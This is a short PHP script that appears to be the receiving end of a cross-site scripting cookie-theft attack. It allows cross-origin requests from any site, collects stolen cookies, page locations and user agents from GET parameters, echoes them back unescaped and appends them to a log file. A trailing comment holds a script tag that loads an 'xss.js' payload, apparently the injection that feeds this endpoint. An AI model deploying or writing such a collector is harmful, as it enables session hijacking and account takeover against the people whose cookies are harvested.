<?php
// Allow from any origin
if (isset($_SERVER['HTTP_ORIGIN'])) {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Max-Age: 86400'); // cache for 1 day
}

// Access-Control headers are received during OPTIONS requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    
    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    
    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
        header("Access-Control-Allow-Headers:        {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
    
    exit(0);
}
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $cookie    = $_GET['cookie'];
    echo $cookie;
    $location = $_GET['location'];
	echo $location;
    
    file_put_contents("formdata.txt", "User Agent" . $useragent . ", cookie " . $cookie . ", location " . $location . PHP_EOL, FILE_APPEND);
    
}
//going home for festival <script src="http://localhost/leave/js/xss.js"></script>

?>